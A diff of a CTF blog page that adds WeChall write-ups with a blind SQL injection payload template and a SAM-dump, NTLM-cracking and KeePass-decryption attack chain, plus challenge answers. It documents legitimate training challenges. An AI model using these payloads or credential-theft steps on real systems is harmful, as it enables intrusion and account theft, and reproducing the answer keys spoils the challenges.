@@ -235,7 +235,7 @@ p.spoiler {
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">337</span>
+          <span class="site-state-item-count">339</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
@@ -376,6 +376,272 @@ p.spoiler {
     </div>
 
     <div class="main-inner index posts-expand">
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://vkkkv.github.io/wp/WeChall/wechall-table-names-2/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="vkkkv">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hello Navi">
+      <meta itemprop="description" content="A blog about CTF writeups, Linux, Mathematics, Technology, and personal thoughts.">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content=" | Hello Navi">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/wp/WeChall/wechall-table-names-2/" class="post-title-link" itemprop="url">WeChall - Table Names II</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+      
+
+      <time title="Created: 2026-06-13 19:33:08 / Modified: 19:33:09" itemprop="dateCreated datePublished" datetime="2026-06-13T19:33:08+08:00">2026-06-13</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/ctf/" itemprop="url" rel="index"><span itemprop="name">ctf</span></a>
+        </span>
+    </span>
+
+  
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Disqus: </span>
+    
+    <a title="disqus" href="/wp/WeChall/wechall-table-names-2/#disqus_thread" itemprop="discussionUrl">
+      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="wp/WeChall/wechall-table-names-2/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h3 id="challenge">Challenge</h3>
+<p>Table Names
+的进阶版。题目要求找出隐藏的数据库名和表名，答案格式是：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">database_table</span><br></pre></td></tr></table></figure>
+<p>相比第一版，常规的 <code>information_schema.tables</code> /
+<code>database()</code> 路线会被过滤。</p>
+<h3 id="solution">Solution</h3>
+<p>后端查询大致是用隐藏配置拼出完整表名：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> <span class="operator">&lt;</span>secret_database<span class="operator">&gt;</span>.<span class="operator">&lt;</span>secret_table<span class="operator">&gt;</span></span><br><span class="line"><span class="keyword">WHERE</span> username<span class="operator">=</span><span class="string">&#x27;$username&#x27;</span> <span class="keyword">AND</span> password<span class="operator">=</span><span class="string">&#x27;$password&#x27;</span></span><br></pre></td></tr></table></figure>
+<p>不能直接查 <code>information_schema.tables</code> 时，可以转向
+<code>information_schema.processlist</code>。当前正在执行的 SQL
+文本会出现在 <code>processlist.info</code> 中，而这个 SQL 正好包含完整的
+<code>database.table</code>。</p>
+<p>盲注模板：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">username<span class="operator">=</span>test<span class="string">&#x27; OR IF(</span></span><br><span class="line"><span class="string">  (SELECT ASCII(SUBSTR(info, &lt;pos&gt;, 1)) = &lt;ord&gt;</span></span><br><span class="line"><span class="string">   FROM information_schema.processlist</span></span><br><span class="line"><span class="string">   WHERE info LIKE 0x2553454c45435425</span></span><br><span class="line"><span class="string">   LIMIT 1),</span></span><br><span class="line"><span class="string">  1,</span></span><br><span class="line"><span class="string">  0</span></span><br><span class="line"><span class="string">)#</span></span><br><span class="line"><span class="string">password=test</span></span><br></pre></td></tr></table></figure>
+<p>也可以用二分：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ASCII(SUBSTR(info, <span class="operator">&lt;</span>pos<span class="operator">&gt;</span>, <span class="number">1</span>)) <span class="operator">&gt;</span> <span class="operator">&lt;</span>mid<span class="operator">&gt;</span></span><br></pre></td></tr></table></figure>
+<p>逐字符恢复 <code>info</code> 后，从 SQL 文本里抽出
+<code>&lt;secret_database&gt;.&lt;secret_table&gt;</code>，再把点号换成下划线提交。</p>
+<p>通过 <code>SUBSTR(info,1,200)</code> 直接从 processlist
+提取完整查询文本，确认当前账号下数据库和表名为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nurfedtables37.userbobbytable7</span><br></pre></td></tr></table></figure>
+<span class="spoiler" onclick="this.classList.toggle('spoiler')"><span class="spoiler-blur ">nurfedtables37_userbobbytable7</span></span>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://vkkkv.github.io/wp/WeChall/wechall-bill-for-bill/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="vkkkv">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hello Navi">
+      <meta itemprop="description" content="A blog about CTF writeups, Linux, Mathematics, Technology, and personal thoughts.">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content=" | Hello Navi">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/wp/WeChall/wechall-bill-for-bill/" class="post-title-link" itemprop="url">WeChall - bill for Bill</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+      
+
+      <time title="Created: 2026-06-13 19:28:09 / Modified: 19:28:10" itemprop="dateCreated datePublished" datetime="2026-06-13T19:28:09+08:00">2026-06-13</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/ctf/" itemprop="url" rel="index"><span itemprop="name">ctf</span></a>
+        </span>
+    </span>
+
+  
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Disqus: </span>
+    
+    <a title="disqus" href="/wp/WeChall/wechall-bill-for-bill/#disqus_thread" itemprop="discussionUrl">
+      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="wp/WeChall/wechall-bill-for-bill/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h3 id="challenge">Challenge</h3>
+<p>Cracking/Forensics 类（Storyline 系列），由 Z 创作。</p>
+<p>一个叫 Bill 的人把秘密藏在加密的 KeePass 数据库里。需要从他的 Windows
+SAM 文件开始，走完整条攻击链才能拿到最终的答案。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">给的文件: files.zip</span><br><span class="line">├── SAM        # Windows SAM (Security Account Manager)</span><br><span class="line">├── system     # SYSTEM registry hive（对应加密的 boot key）</span><br><span class="line">└── keepass.kdb  # KeePass 1.x KDB 格式</span><br></pre></td></tr></table></figure>
+<h3 id="solution">Solution</h3>
+<h4 id="step-1-从-sam-system-提取-ntlm-hash">Step 1 — 从 SAM + SYSTEM
+提取 NTLM hash</h4>
+<p><code>secretsdump.py</code>（impacket 包）从 SAM + SYSTEM
+离线提取本地用户的 hash：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ secretsdump.py -sam SAM -system system LOCAL</span><br><span class="line">Impacket v0.12.0 - Copyright 2023 Fortra</span><br><span class="line"></span><br><span class="line">[*] Target system bootKey: 0xac285427313a1c9a8dc2e8b3421a2e22</span><br><span class="line">[*] Dumping local SAM hashes:</span><br><span class="line">Bill:500:7f4ac180230c769790d3d8ad454f5167:cfb69fa6cb1d792d63b02c6eefc807e5:::</span><br></pre></td></tr></table></figure>
+<p>格式：<code>用户:RID:LM_HASH:NTLM_HASH:::</code> NTLM hash（第二个 32
+hex）是 <code>cfb69fa6cb1d792d63b02c6eefc807e5</code>。</p>
+<p>LM hash <code>7f4ac180230c769790d3d8ad454f5167</code> 非空（非
+<code>aad3b4...</code>），说明密码 &gt;= 8 字符，可以用 Ophcrack +
+rainbow table 破解。但走 NTLM 更直接。</p>
+<h4 id="step-2-破解-ntlm-hash">Step 2 — 破解 NTLM hash</h4>
+<p>在线 NTLM 查询 <span class="exturl" data-url="aHR0cHM6Ly9udGxtLnB3">ntlm.pw<i class="fa fa-external-link-alt"></i></span>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://ntlm.pw/cfb69fa6cb1d792d63b02c6eefc807e5</span><br><span class="line">→ W3cH4112u1Z99</span><br></pre></td></tr></table></figure>
+<p>离线可用 john + rockyou 或 hashcat。</p>
+<p>Windows 密码: <code>W3cH4112u1Z99</code></p>
+<p>index2.php 有一段 substitution cipher 隐藏 hint，解码后提示用
+Ophcrack + ~380MB rainbow table 破解 LM hash，但 NTLM
+在线查表更快，结果一致（LM 大写版 <code>W3CH4112U1Z99</code>
+无额外信息）。</p>
+<h4 id="step-3-解密-keepass">Step 3 — 解密 KeePass</h4>
+<p>剧情设计上 Bill 是密码复用受害者——KeePass 密码 == Windows 密码。</p>
+<p>keepass.kdb 是 <strong>KeePass 1.x KDB 格式</strong>（非
+KDBX），AES-256-CBC 加密。Python 库 <code>pykeepass</code> 只支持
+KDBX，需用 <code>libkeepass</code>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ pip install libkeepass</span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> libkeepass</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> libkeepass.<span class="built_in">open</span>(<span class="string">&#x27;keepass.kdb&#x27;</span>, password=<span class="string">&#x27;W3cH4112u1Z99&#x27;</span>) <span class="keyword">as</span> db:</span><br><span class="line">    <span class="keyword">for</span> entry <span class="keyword">in</span> db.entries:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Group: <span class="subst">&#123;entry[<span class="string">&#x27;group&#x27;</span>]&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;  Title: <span class="subst">&#123;entry[<span class="string">&#x27;title&#x27;</span>]&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;  Username: <span class="subst">&#123;entry[<span class="string">&#x27;username&#x27;</span>]&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;  Password: <span class="subst">&#123;entry[<span class="string">&#x27;password&#x27;</span>]&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>()</span><br></pre></td></tr></table></figure>
+<p>KeePass 结构：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">Group: credit card</span><br><span class="line">  Title: Amex</span><br><span class="line">  Username: 371234567895006:08/05-18/05:562</span><br><span class="line">  Password:</span><br><span class="line"></span><br><span class="line">Group: Personal</span><br><span class="line">  Title: Personal data</span><br><span class="line">  Username: William Henry Gates III</span><br><span class="line">  Password:</span><br><span class="line"></span><br><span class="line">Group: W1nd0ws</span><br><span class="line">  Title: My home w1n box</span><br><span class="line">  Username: Bill</span><br><span class="line">  Password: W3cH4112u1Z99</span><br><span class="line"></span><br><span class="line">Group: eMail</span><br><span class="line">  Title: My hotmail account</span><br><span class="line">  Username: BillG@h0tma1l.com</span><br><span class="line">  Password:               ← 空字符串，这就是密码</span><br></pre></td></tr></table></figure>
+<p>四个 entry 分布在 7 个 group 中（另有空的 L1nux、M4C、Backup
+组）。</p>
+<p>关键条目：<code>Amex</code> 的 username 包含完整信用卡数据（格式
+<code>CC_NUMBER:VALID_FROM-EXPIRY:CVV</code>）。</p>
+<h4 id="step-4-提交信用卡">Step 4 — 提交信用卡</h4>
+<p><code>check_card.php</code> 接受 POST 字段
+<code>cc</code>（maxlength=31）：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ curl -s -b &#x27;WC=...&#x27; \</span><br><span class="line">  --data-urlencode &#x27;cc=371234567895006:08/05-18/05:562&#x27; \</span><br><span class="line">  &#x27;https://www.wechall.net/challenge/Z/bill_for_bill/check_card.php&#x27;</span><br></pre></td></tr></table></figure>
+<span class="spoiler" onclick="this.classList.toggle('spoiler')"><span class="spoiler-blur ">371234567895006:08/05-18/05:562</span></span>
+<p>返回提示需要登录父亲的邮箱删除交易通知邮件，进入下一步。</p>
+<h4 id="step-5-登录邮箱删邮件">Step 5 — 登录邮箱删邮件</h4>
+<p><code>signin.php</code> 是一个仿 Microsoft Live ID 的钓鱼页面，POST
+到 <code>login.php</code>。</p>
+<p>KeePass 中 email 条目的 password 字段是空字符串——这就是密码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">POST login=BillG@h0tma1l.com&amp;passwd=&amp;SI=Signin&amp;LoginOptions=2</span><br><span class="line">→ 302 Redirect → loggedin.php</span><br></pre></td></tr></table></figure>
+<p>登录后收件箱中有一封来自 M4C 的未读邮件，checkbox 的
+<code>value="thisisit"</code>。通过 <code>loggedin.php?del=sel</code>
+标记删除。</p>
+<p>至此攻击链完成：从 Windows SAM 一路走到删除银行通知邮件。</p>
+<h4 id="step-6-提交-wechall-答案">Step 6 — 提交 WeChall 答案</h4>
+<p>全部分析完成后，在主站 solution form 提交答案：</p>
+<span class="spoiler" onclick="this.classList.toggle('spoiler')"><span class="spoiler-blur ">passwordsuxx</span></span>
+<h3 id="summary">Summary</h3>
+<p>完整的 Windows
+凭证盗窃链：<code>SAM+SYSTEM → NTLM hash → 密码复用 → KeePass → 敏感数据泄露 → 登录邮箱销毁证据</code>。</p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
 
     
 
@@ -1345,247 +1611,6 @@ base 表示的等式。计算结果并以 solution base 表示提交。限时 3.
 内完成抓题→计算→提交</li>
 </ul>
 <p>答案 session-bound，每次不同，无法复用固定值。</p>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="https://vkkkv.github.io/wp/WeChall/wechall-pyhash/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.png">
-      <meta itemprop="name" content="vkkkv">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Hello Navi">
-      <meta itemprop="description" content="A blog about CTF writeups, Linux, Mathematics, Technology, and personal thoughts.">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content=" | Hello Navi">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/wp/WeChall/wechall-pyhash/" class="post-title-link" itemprop="url">WeChall - PyHash</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">Posted on</span>
-      
-
-      <time title="Created: 2026-06-11 13:59:19 / Modified: 13:59:20" itemprop="dateCreated datePublished" datetime="2026-06-11T13:59:19+08:00">2026-06-11</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">In</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/ctf/" itemprop="url" rel="index"><span itemprop="name">ctf</span></a>
-        </span>
-    </span>
-
-  
-  
-  <span class="post-meta-item">
-    
-      <span class="post-meta-item-icon">
-        <i class="far fa-comment"></i>
-      </span>
-      <span class="post-meta-item-text">Disqus: </span>
-    
-    <a title="disqus" href="/wp/WeChall/wechall-pyhash/#disqus_thread" itemprop="discussionUrl">
-      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="wp/WeChall/wechall-pyhash/" itemprop="commentCount"></span>
-    </a>
-  </span>
-  
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <blockquote>
-<p>PyHash (Coding, Python) by gizmore 利用 CPython 大整数 hash
-的同余性质绕过哈希检查</p>
-</blockquote>
-<h3 id="challenge">Challenge</h3>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">def fly_away(num: int) -&gt; bool:</span><br><span class="line">    return hash(num) == 31337</span><br></pre></td></tr></table></figure>
-<p>要求找一个整数参数使函数返回 <code>True</code>。题面注明测试环境是
-<strong>CPython 64-bit Python 3.10</strong>。</p>
-<h3 id="solution">Solution</h3>
-<p>CPython 对小整数有优化：<code>hash(n) == n</code>。所以直接传
-<code>31337</code> 的话，<code>hash(31337) == 31337</code>
-确实成立——但题面暗示要更大的整数，而且必须用 <code>int</code>，不是
-<code>float</code>。</p>
-<p>关键是大整数的 hash 实现。CPython 用一个固定 modulus 做折叠：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">P = sys.hash_info.modulus  <span class="comment"># 64-bit CPython: 2**61 - 1 = 2305843009213693951</span></span><br></pre></td></tr></table></figure>
-<p>对一个任意大整数 <code>x</code>，<code>hash(x)</code> 近似等于
-<code>x % P</code>（实际还有一步 murmur-style
-mixing，但对这个场景不重要）。因此构造一个与 <code>31337</code> 同余于
-<code>P</code> 的大整数即可：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">P = sys.hash_info.modulus</span><br><span class="line">candidate = <span class="number">31337</span> + P  <span class="comment"># 2305843009213725288</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hash</span>(candidate))  <span class="comment"># 31337</span></span><br></pre></td></tr></table></figure>
-<p>完整解法：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fly_away</span>(<span class="params">num: <span class="built_in">int</span></span>) -&gt; <span class="built_in">bool</span>:</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">hash</span>(num) == <span class="number">31337</span></span><br><span class="line"></span><br><span class="line">P = sys.hash_info.modulus          <span class="comment"># 2**61 - 1</span></span><br><span class="line">num = <span class="number">31337</span> + P                    <span class="comment"># 2305843009213725288</span></span><br><span class="line"><span class="keyword">assert</span> fly_away(num)               <span class="comment"># True</span></span><br><span class="line"><span class="built_in">print</span>(num)                         <span class="comment"># 提交这个数</span></span><br></pre></td></tr></table></figure>
-<p>这个解依赖 CPython 实现细节和 64-bit 平台。32-bit CPython 的 modulus
-是 <code>2**31 - 1</code>，其他 Python implementation（PyPy,
-Jython）可能完全不同。在目标版本（CPython 3.10 64-bit）上验证通过。</p>
-<p>如果 <code>31337 + P</code> 已被别人提交过，就试
-<code>31337 + k * P</code>（k 为任意正整数）——所有同余值都有效。</p>
-<span class="spoiler" onclick="this.classList.toggle('spoiler')"><span class="spoiler-blur ">2305843009213725288（或 31337 + k * 2305843009213693951）</span></span>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="https://vkkkv.github.io/wp/WeChall/wechall-training-caterpillar/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.png">
-      <meta itemprop="name" content="vkkkv">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Hello Navi">
-      <meta itemprop="description" content="A blog about CTF writeups, Linux, Mathematics, Technology, and personal thoughts.">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content=" | Hello Navi">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/wp/WeChall/wechall-training-caterpillar/" class="post-title-link" itemprop="url">WeChall - Training - Caterpillar</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">Posted on</span>
-      
-
-      <time title="Created: 2026-06-10 19:47:33 / Modified: 19:49:46" itemprop="dateCreated datePublished" datetime="2026-06-10T19:47:33+08:00">2026-06-10</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">In</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/ctf/" itemprop="url" rel="index"><span itemprop="name">ctf</span></a>
-        </span>
-    </span>
-
-  
-  
-  <span class="post-meta-item">
-    
-      <span class="post-meta-item-icon">
-        <i class="far fa-comment"></i>
-      </span>
-      <span class="post-meta-item-text">Disqus: </span>
-    
-    <a title="disqus" href="/wp/WeChall/wechall-training-caterpillar/#disqus_thread" itemprop="discussionUrl">
-      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="wp/WeChall/wechall-training-caterpillar/" itemprop="commentCount"></span>
-    </a>
-  </span>
-  
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <h3 id="challenge">Challenge</h3>
-<p>I have drawn a picture of a caterpillar and hid some text in it. I am
-sure you can figure it out, as it is not too hard :)</p>
-<h3 id="solution">Solution</h3>
-<p>下载 <code>caterpillar.png</code>（220x55, RGBA）</p>
-<p>标准 stegano 分析（zsteg, bit plane 扫描, LSB/MSB 全通道）无结果。PNG
-只有 IHDR/sRGB/bKGD/pHYs/IDAT/IEND 六个 chunk，无附加数据。</p>
-<p>数据不在 RGB 裸值里，而是藏在<strong>其他色彩空间的 Hue
-值</strong>中。</p>
-<p>RGB 是加色混色——R, G, B 各 0-255。毛虫的主色是黄绿，以
-RGB(135,194,41) 为例：</p>
-<ul>
-<li>R=135：不在可打印 ASCII 范围（32-126）外，chr(135) 是扩展字符</li>
-<li>G=194：同上，超出范围</li>
-<li>B=41：chr(41) = <code>)</code>，无意义</li>
-</ul>
-<p>直接用 RGB 值当 ASCII 只能得到一堆乱码。</p>
-<h4 id="色彩空间可以互相转换">色彩空间可以互相转换</h4>
-<p>RGB 和 HSV
-描述的是<strong>同一个颜色</strong>，只是坐标系不同——就像经纬度
-(116.4°E, 39.9°N) 和北京市地址是同一地点。</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> colorsys</span><br><span class="line"></span><br><span class="line">r, g, b = <span class="number">135</span>, <span class="number">194</span>, <span class="number">41</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># RGB -&gt; HSV</span></span><br><span class="line">h, s, v = colorsys.rgb_to_hsv(r/<span class="number">255</span>, g/<span class="number">255</span>, b/<span class="number">255</span>)</span><br><span class="line"><span class="comment"># h = 83° (色相角度), s = 79% (饱和度), v = 76% (明度)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># HSV -&gt; RGB (可逆)</span></span><br><span class="line">r2, g2, b2 = colorsys.hsv_to_rgb(h, s, v)</span><br><span class="line"><span class="comment"># (r2,g2,b2) == (135,194,41)  # 无损还原</span></span><br></pre></td></tr></table></figure>
-<p>转换公式是解析的，无精度损失。</p>
-<h4 id="解法">解法</h4>
-<p>毛虫的 8 个主 body segment，每个用了一种特定的颜色。RGB→HSV
-后，H（色相角度）落在可打印 ASCII 范围内：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">segment 1 (x=  0- 22)  #e1f0c9    H=83° -&gt; &#x27;S&#x27;</span><br><span class="line">segment 2 (x= 23- 46)  #e8f4d7    H=85° -&gt; &#x27;U&#x27;</span><br><span class="line">腿阴影   (x= 47- 69)  #6e7d4d    H=79° -&gt; &#x27;O&#x27;</span><br><span class="line">腿阴影   (x= 70- 92)  #465512    H=73° -&gt; &#x27;I&#x27;</span><br><span class="line">segment 3 (x= 93-115)  #a9bb27    H=67° -&gt; &#x27;C&#x27;</span><br><span class="line">segment 4 (x=116-140)  #557315    H=79° -&gt; &#x27;O&#x27;</span><br><span class="line">segment 5 (x=141-165)  #7dad30    H=83° -&gt; &#x27;S&#x27;</span><br><span class="line">segment 6 (x=166-187)  #eaf4d0    H=77° -&gt; &#x27;M&#x27;</span><br><span class="line">头部     (x=188-219)  #e06478    H=350° -&gt; 不可打印 (结束标记)</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
